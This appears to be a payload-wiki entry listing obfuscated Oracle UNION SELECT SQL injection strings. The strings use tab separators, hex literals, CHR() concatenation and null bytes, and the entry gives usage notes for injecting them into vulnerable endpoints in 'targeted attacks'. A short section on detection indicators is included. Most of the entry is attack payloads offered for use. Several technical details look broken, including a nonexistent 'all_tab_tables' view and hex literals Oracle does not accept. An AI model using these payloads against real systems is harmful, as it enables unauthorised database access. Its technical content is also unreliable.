---
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:36.798613+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - sql-injection
  - obfuscation
  - oracle
validated: true
---

# Oracle-Union-Select-Obfuscation-Payloads

## Code

```sql
1FUNION	SELECT	2	
1DUNION	SELECT	2	
SELECT	0x7461626c655f6e616d65	FROM	all_tab_tables
SELECT	CHR(116)	||	CHR(97)	||	CHR(98)	FROM	all_tab_tables
SELECT%00table_name%00FROM%00all_tab_tables
```

## Description

These Oracle-specific obfuscated UNION SELECT payloads use hex encoding (0x...), concatenation with CHR() for ASCII buildup, and null bytes (%00) as separators to extract table names from all_tab_tables, bypassing filters in Oracle-backed web apps.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 0x7461626c655f6e616d65 | Hex-encoded string for 'table_name' | 0x7461626c655f6e616d65 |
| CHR(116)||CHR(97)||CHR(98) | Builds 'tab' via ASCII codes (extend for full names) | CHR(116) for 't' |
| table_name | Column to select, separated by nulls | table_name |

## Usage

Inject into Oracle-vulnerable endpoints: ?id=1' [payload] --. Use to enumerate tables: SELECT table_name FROM all_tab_tables via obfuscated UNION. Suitable for targeted attacks on Oracle databases, following generic payloads if DBMS is confirmed.

## Detection

- Oracle audit logs capturing CHR() or hex in queries.
- WAF rules triggering on || concatenation or %00 in parameters.
- Anomalous access to all_tab_tables from web app user.
- Response payloads containing partial table names or hex artifacts.

## Related

- [[procedures/Union-Based-SQL-Injection-with-DBMS-Obfuscation]]
- [[tools/sqlmap]]
